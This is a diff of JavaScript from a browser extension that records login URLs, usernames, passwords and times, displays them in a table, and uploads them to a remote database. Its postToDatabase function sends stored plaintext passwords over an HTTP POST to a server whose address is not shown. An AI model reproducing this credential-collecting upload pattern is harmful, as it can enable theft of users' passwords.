@@ -1,8 +1,9 @@
 function loadTable() {
 
-    chrome.storage.sync.get(null, function (result) {
+    chrome.storage.sync.get({arrays:[]}, function (result) {
         // count the number of entries
-        var entryCount = result.urls.length;
+		var arrays = result.arrays;
+        var entryCount = arrays.length;
 
         var row, cellUrl, cellUsername, cellPassword, cellTime,
             timeConverted, yyyy, mm, dd, hh, minute, ss, ampm;
@@ -12,38 +13,17 @@ function loadTable() {
             row = table.insertRow(i+1);
 			cellUrl = row.insertCell(0);
             cellUsername = row.insertCell(1);
-            cellPassword = row.insertCell(2);
-            cellTime = row.insertCell(3);
-            cellAttempt = row.insertCell(4);
-			cellSFlag = row.insertCell(5);
-			cellTFlag = row.insertCell(6);
+            cellTime = row.insertCell(2);
+      
+			array = JSON.parse(arrays[i]);
 
-            // format time variable into readable format
-            timeConverted = new Date(result.times[i]);
-            yyyy = timeConverted.getFullYear();
-            mm = timeConverted.getMonth()+1;
-            if (mm < 10) { mm = '0' + mm; }
-            dd = timeConverted.getDate();
-            if (dd < 10) { dd = '0' + dd; }
-            hh = timeConverted.getHours();
-            if (hh >= 12) { hh = hh - 12; ampm = 'PM'; }
-            else { ampm = 'AM' };
-            minute = timeConverted.getMinutes();
-            if (minute < 10) { minute = '0' + minute; }
-            ss = timeConverted.getSeconds();
-            if (ss < 10) { ss = '0' + ss; }
-
-            timeConverted = yyyy + '/' + mm + '/' + dd + ' ' + hh + ':' + minute + ':' + ss + ' ' + ampm;
-
-            cellUrl.innerHTML = result.urls[i];
-            cellUsername.innerHTML = result.usernames[i];
-            cellPassword.innerHTML = result.passwords[i];
-            cellTime.innerHTML = timeConverted;
-            cellAttempt.innerHTML = result.attempts[i];
-			cellSFlag.innerHTML = "T";
-			cellSFlag.style.display='none';
-			cellTFlag.innerHTML = "T";
-			cellTFlag.style.display='none';
+            cellUrl.innerHTML = array.url;
+            cellUsername.innerHTML = array.username;
+            cellTime.innerHTML = array.time;
+            
+			
+		
+			
         }
     });
 }
@@ -60,6 +40,8 @@ function showResult() {
 		}
         show();
 	}
+
+
 	//if there is text to search
     else {
         if (radioURL.checked) {
@@ -105,6 +87,12 @@ function countResult(count) {
     }
 }
 
+function resetHistory() {
+    chrome.storage.local.clear();
+    alert("History cleared!");
+    chrome.tabs.reload();
+}
+
 function removeTable() {
     for (i = 0; i < entryCount; i++) {
         row = table.deleteRow(entryCount - i);
@@ -121,6 +109,8 @@ function changeSelect(){
 	var today = dateToInt(time.getFullYear(), time.getMonth()+1, time.getDate());
 	//alert("today: "+today);
 
+
+
 	var twodayago = new Date();
 	twodayago.setDate(twodayago.getDate()-2);
 	twodayago = dateToInt(twodayago.getFullYear(), twodayago.getMonth()+1, twodayago.getDate());
@@ -134,12 +124,9 @@ function changeSelect(){
 				var row = rows[i];
 				row.getElementsByTagName("td")[6].innerHTML ="T";
 			}
-
-
 			break;
 		case 1://1day
 			alert(dropdown.options[1].value);
-
 			for (var i = 1; i < rows.length; i++){
 				var row = rows[i];
 				if (row.style.display!='none'){
@@ -249,18 +236,15 @@ function changeSelect(){
 	}
 	show();
 }
-
 function getByIndex(str, start, finish){
 	var result = "";
 	for (var i = start; i < finish+1; i++){
 		result += str.charAt(i);}
 	return result;
 }
-
 function dateToInt(a, b, c){
 	return parseInt(a)*10000+parseInt(b)*100+parseInt(c);
 }
-
 function show(){
 	rows = table.getElementsByTagName("tr");
 	var count = 0;
@@ -290,14 +274,8 @@ function getFromFile() {
     xhr.send();
 }
 
-function resetHistory() {
-    chrome.storage.sync.clear();
-    alert("History cleared!");
-    chrome.tabs.reload();
-}
-
 function postToDatabase() {
-    chrome.storage.sync.get(null, function (result) {
+    chrome.storage.local.get(null, function (result) {
         // count the number of entries
         entryCount = result.urls.length;
 
@@ -308,8 +286,6 @@ function postToDatabase() {
             urlTemp = result.urls[i];
             usernameTemp = result.usernames[i];
             passwordTemp = result.passwords[i];
-            // replace '+' symbol with "%2B"
-            passwordTemp = passwordTemp.replace("+", "%2B");
             timeTemp = result.times[i];
 
             var input = "url="+urlTemp+"&username="+usernameTemp+"&password="+passwordTemp+"&time="+timeTemp;
@@ -326,20 +302,14 @@ function postToDatabase() {
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.send(input);
         }
-        resetHistory();
     });
 }
 
+
 var entryCount;
-var resetButton = document.querySelector("button[id=reset]");
-var searchButton = document.querySelector("button[id=search]");
 var searchText = document.getElementById("searchText");
-var table = document.getElementById("loginInfoTable");
-var radioURL = document.getElementById("radioURL");
-var radioID = document.getElementById("radioID");
-var dropdown = document.getElementById("select");
+var table = document.getElementById("loginarray");
+
 
 document.body.onload = loadTable;
-resetButton.onclick = postToDatabase;
-searchButton.onclick = showResult;
-dropdown.onchange = changeSelect;
+
